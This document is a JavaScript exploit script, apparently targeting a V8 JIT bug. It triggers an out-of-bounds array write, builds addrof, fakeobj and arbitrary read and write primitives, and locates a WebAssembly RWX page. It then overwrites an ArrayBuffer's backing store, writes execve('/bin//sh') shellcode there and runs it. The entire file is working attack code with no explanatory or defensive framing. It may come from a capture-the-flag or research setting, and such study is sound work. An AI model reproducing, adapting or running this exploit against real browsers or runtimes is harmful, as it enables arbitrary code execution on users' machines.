var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function write_shellcode(){
    shellcode = [0x90909090d2314850n, 0x69622fbb48f63148n, 0x5f545368732f2f6en, 0x90909090050f3bb0n];
    rwx_high = rwx & 0xffffffffn;
    rwx_low = rwx / 0x100000000n;
    aaw(backingStoreAddr, itof(rwx>>32n));
   aaw(backingStoreAddr-4n, itof(rwx));

    for(let i =0; i<shellcode.length;i++){
        dataview.setFloat64(i*Float64Array.BYTES_PER_ELEMENT, itof(shellcode[i]), true);
    }
}

array = Array(0x40000).fill(1.1);
args = Array(0x100 - 1).fill(array);
args.push(Array(0x40000 - 4).fill(2.2));
giant_array = Array.prototype.concat.apply([], args);
giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);

let _l = itof((0x10000n << 33n) + 0x59578d95n);

function trigger(array,l) {
  var x = array.length;
  x -= 67108861;
  x = Math.max(x, 0);
  x *= 6;
  x -= 5;
  x = Math.max(x, 0);

  let corrupting_array = [0.1, 0.1];
  let corrupted_array = [0.1];

  corrupting_array[x] = l;
  return [corrupting_array, corrupted_array];
}

function addrof(obj) {
  a[7] = itof(object_map);
  c[0] = obj;
  a[7] = itof(double_map);
  return ftoi(c[0]);
}

function fakeobj(addr) {
  a[14] = itof(double_map);
  b[0] = BigInt(itof(addr));
  a[14] = itof(object_map);
  return b[0];
}

function aar(addr) {
  let temp = ftoi(a[14]);
  a[8] = itof((0x10n << 32n) + addr-0x8n);
  let val = ftoi(c[0]);
  a[8] = itof(temp);
  return val;
}

function aaw(addr,value) {
  let temp = ftoi(a[8]);
  a[8] = itof((0x10n << 32n) + addr-0x8n);
  let val = ftoi(c[0]);
  c[0] = value;
  a[8] = itof(temp);
  c[0] = itof(val);
}

for (let i = 0; i < 30000; ++i) {
  trigger(giant_array,_l);
}

let i;
let ret = trigger(giant_array,_l)[1];
console.log('corrupted array length: ' + ret.length.toString(16));

var a = [1.1,2.2,3.3];
var c = [1.1,1.1,1.1];
var b = {kek:1};

for (let index = 0; index < ret.length; index++) {
  let x = ftoi(ret[index]).toString(16);
  if(x == '3ff199999999999a'){
    x = ftoi(ret[index + 1]).toString(16);
    if(x == '400199999999999a'){
      x = ftoi(ret[index + 2]).toString(16);
      if(x == '400a666666666666'){
        x = ftoi(ret[index - 4]).toString(16);
        i = index + 4;
        break;
      }
    }
  }
}

ret[i] = itof(ftoi(ret[i]) + (0x10000n << 33n))
console.log('oob length: ' + a.length.toString(16));

var double_map = ftoi(a[7]);
var object_map = ftoi(a[14]);
console.log("double map: 0x" + double_map.toString(16));
console.log("object map: 0x" + object_map.toString(16));

// aaw(addrof(b),itof(0x58588d95n));

var target_buffer = new ArrayBuffer(0x500);
var dataview = new DataView(target_buffer);

let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
   
let wasmFunction = wasmInstance.exports.main;
let rwx = aar(addrof(wasmInstance) + 0x67n) >> 8n;
let backingStoreAddr = addrof(target_buffer)+0x18n;

console.log("rwx: 0x" + rwx.toString(16));
console.log("backing store: 0x" + backingStoreAddr.toString(16));

write_shellcode();
wasmFunction();